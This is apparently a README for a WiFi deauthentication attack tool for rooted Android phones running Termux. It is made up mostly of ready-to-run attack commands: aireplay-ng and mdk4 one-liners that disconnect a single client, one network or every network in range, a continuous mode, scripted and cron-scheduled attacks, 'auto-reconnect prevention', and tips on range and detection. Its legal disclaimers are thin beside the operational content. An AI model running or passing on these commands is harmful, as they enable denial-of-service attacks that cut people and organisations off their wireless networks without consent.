
# **Wi‑Fi Deauthentication Attack Tool for Termux** 📡

![WiFi Deauth](https://img.shields.io/badge/WiFi-Deauth-red)
![Termux](https://img.shields.io/badge/Termux-Android-green)
![Python](https://img.shields.io/badge/Python-3.10-blue)
![Root](https://img.shields.io/badge/Root-Required-orange)

> **⚠️ WARNING: This tool is for authorized security testing only. Unauthorized use is illegal.**

## **What This Tool Does**

This tool sends deauthentication packets to disconnect devices from WiFi networks. It's like a WiFi "kick" button that forces devices to disconnect and sometimes prevents reconnection.

## **Quick Start**

### **1. Install Dependencies**
```bash
# Get root first
tsu

# Install required packages
pkg update && pkg upgrade -y
pkg install -y python git root-repo tsu
pkg install -y aircrack-ng wireless-tools
pip install colorama
```

### **2. Download the Tool**
```bash
# Clone or download
git clone https://github.com/hubaxgpt/wifi-deauth.git
cd wifi-deauth

# Or download directly
curl -O https://raw.githubusercontent.com/hubaxgpt/wifi-deauth/main/wifi_deauth.py
chmod +x wifi_deauth.py
```

### **3. Run the Attack**
```bash
# Get root
tsu

# Run the tool
python3 wifi_deauth.py
```

## **How It Works**

### **The Science Behind It**
```
Normal WiFi Connection:
Device <-----> Access Point (Continuous communication)

After Deauth Attack:
Device <--X--> Access Point (Connection broken)
           |
           └── Deauth packet says "Fuck off, disconnect!"
```

### **What Actually Happens**
1. **Scan**: Finds nearby WiFi networks
2. **Target**: Selects network to attack
3. **Attack**: Sends deauth packets
4. **Result**: Devices get disconnected

## **Full Installation**

### **Step-by-Step Setup**
```bash
# 1. Update everything
pkg update && pkg upgrade -y

# 2. Install essential tools
pkg install -y python git root-repo tsu
pkg install -y aircrack-ng wireless-tools
pkg install -y net-tools procps

# 3. Install Python packages
pip install --upgrade pip
pip install colorama

# 4. Download the tool
git clone https://github.com/hubaxgpt/wifi-deauth.git
cd wifi-deauth

# 5. Make executable
chmod +x wifi_deauth.py
chmod +x install.sh

# 6. Run installation script
./install.sh
```

### **Check Your Hardware**
```bash
# Test if your WiFi supports monitor mode
tsu -c 'iw list | grep -i monitor'

# If you see "monitor" in output, you're good
# If not, you need external USB WiFi adapter
```

## **Usage Examples**

### **Basic Attack**
```bash
# Run interactive mode
tsu -c 'python3 wifi_deauth.py'

# Follow prompts:
# 1. Select interface (usually wlan0)
# 2. Scan for networks
# 3. Select target
# 4. Start attack
```

### **One-Liner Attacks**
```bash
# Attack specific network
tsu -c 'aireplay-ng --deauth 100 -a TARGET:BSSID:MAC wlan0'

# Attack specific client
tsu -c 'aireplay-ng --deauth 100 -a AP:BSSID:MAC -c CLIENT:MAC wlan0'

# Continuous attack
tsu -c 'aireplay-ng --deauth 0 -a TARGET:BSSID:MAC wlan0'
```

### **Advanced Attacks**
```bash
# Attack all networks in range
tsu -c 'python3 wifi_deauth.py --mode mass'

# Target specific channel
tsu -c 'python3 wifi_deauth.py --channel 6'

# Continuous scan and attack
tsu -c 'python3 wifi_deauth.py --auto'
```

## **Command Reference**

### **Main Tool Commands**
```bash
# Basic usage
python3 wifi_deauth.py

# With arguments
python3 wifi_deauth.py --interface wlan0 --timeout 30

# Attack specific target
python3 wifi_deauth.py --bssid TARGET:BSSID:MAC

# Attack with client targeting
python3 wifi_deauth.py --bssid AP:BSSID:MAC --client CLIENT:MAC
```

### **Aireplay-ng Commands**
```bash
# Send 100 deauth packets
aireplay-ng --deauth 100 -a TARGET:BSSID:MAC wlan0

# Send 0 for continuous (Ctrl+C to stop)
aireplay-ng --deauth 0 -a TARGET:BSSID:MAC wlan0

# Deauth specific client
aireplay-ng --deauth 50 -a AP:BSSID:MAC -c CLIENT:MAC wlan0

# Set packet interval (milliseconds)
aireplay-ng --deauth 100 -a TARGET:BSSID:MAC -x 10 wlan0
```

### **MDK4 Commands (More Aggressive)**
```bash
# Deauth all networks
mdk4 wlan0 d

# Deauth specific network
mdk4 wlan0 d -B TARGET:BSSID:MAC

# Deauth on specific channels
mdk4 wlan0 d -c 1,6,11
```

## **Tool Features**

### **Scanning**
- Network discovery
- Client detection
- Signal strength analysis
- Channel information
- Encryption type detection

### **Attack Modes**
- **Single Target**: Attack one network
- **Mass Attack**: Attack all visible networks
- **Client-Specific**: Target specific device
- **Continuous**: Run until stopped
- **Scheduled**: Attack at specific times

### **Advanced Features**
- MAC address spoofing
- Channel hopping
- Packet rate control
- Logging and reporting
- Auto-reconnect prevention

## **Hardware Requirements**

### **Minimum**
- Android phone with WiFi
- Root access (Magisk recommended)
- 2GB+ RAM
- 1GB free storage

### **Recommended**
- External USB WiFi adapter (ALFA AWUS036ACH)
- USB OTG cable
- Power bank
- Android 10+

### **Why External Adapter?**
Most phone WiFi chips don't support monitor mode. External adapters:
- Support monitor mode
- Have better range
- Won't break your phone's WiFi
- Work with more tools

## **Troubleshooting**

### **"Monitor Mode Not Supported"**
```bash
# Check your chip
iw list | grep -A 10 "Supported"

# If no monitor mode, get external adapter
# Recommended: ALFA AWUS036ACH
```

### **"Operation Not Permitted"**
```bash
# You need root!
tsu
# Or
su
```

### **"No Networks Found"**
```bash
# Check WiFi is on
ip link show wlan0

# Enable monitor mode
airmon-ng start wlan0

# Try different channel
iwconfig wlan0 channel 6
```

### **"Tool Not Working"**
```bash
# Update packages
pkg update && pkg upgrade -y

# Reinstall aircrack
pkg install aircrack-ng --reinstall

# Check dependencies
python3 -c "import colorama; print('OK')"
```

## **Legal & Ethical Use**

### **✅ Legal Uses**
- Testing your own network
- Authorized penetration testing
- Security research with permission
- Educational purposes

### **❌ Illegal Uses**
- Disrupting public WiFi
- Attacking networks without permission
- Harassment
- Any unauthorized access

### **Disclaimer**
```
THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY.
THE AUTHOR IS NOT RESPONSIBLE FOR MISUSE.
YOU ARE RESPONSIBLE FOR YOUR ACTIONS.
ONLY TEST NETWORKS YOU OWN OR HAVE PERMISSION TO TEST.
```

## **FAQ**

### **Q: Does this work without root?**
**A:** No. Root is required for monitor mode.

### **Q: Will this break my phone's WiFi?**
**A:** No, but using external adapter is safer.

### **Q: How far does it work?**
**A:** Typically 50-100 meters with phone, 200+ meters with external adapter.

### **Q: Can I get caught?**
**A:** Yes. WiFi networks can log deauth attacks. Use only with permission.

### **Q: Does it work on 5GHz?**
**A:** Yes, if your adapter supports 5GHz monitor mode.

### **Q: How to stop the attack?**
**A:** Press Ctrl+C in Termux.

## **Advanced Usage**

### **Automated Attacks**
```bash
# Create attack script
echo '#!/bin/bash
tsu -c "aireplay-ng --deauth 100 -a TARGET:BSSID:MAC wlan0"
sleep 10
tsu -c "aireplay-ng --deauth 100 -a TARGET2:BSSID:MAC wlan0"
' > attack.sh

chmod +x attack.sh
./attack.sh
```

### **Schedule Attacks**
```bash
# Use cron
echo '* * * * * tsu -c "aireplay-ng --deauth 50 -a TARGET:BSSID:MAC wlan0"' | crontab -
```

### **Logging**
```bash
# Save attack logs
python3 wifi_deauth.py --log /sdcard/deauth.log

# View logs
tail -f /sdcard/deauth.log
```

## **Support**

### **Issues & Bugs**
```bash
# Run with debug
python3 wifi_deauth.py --debug

# Check system info
termux-info > info.txt

# Submit with:
# 1. What happened
# 2. Debug output
# 3. System info
# 4. Steps to reproduce
```

### **Contact**
- Email: anujin696969@gmail.com

## **Credits**

- **n0merc** - Main developer
- **HUBAX Team** - Testing and support
- **Aircrack-ng team** - Base tools
- **Termux community** - Android hacking platform

## **License**

```
This is free and unencumbered software released into the public domain.

Anyone is free to copy, modify, publish, use, compile, sell, or
distribute this software, either in source code form or as a compiled
binary, for any purpose, commercial or non-commercial, and by any means.

For more information, please refer to <http://unlicense.org/>
```

---

**Last Updated:** 2026-01-24  
**Version:** 1.0.0  
**Author:** n0merc  
**Warning:** Use responsibly or don't use at all.
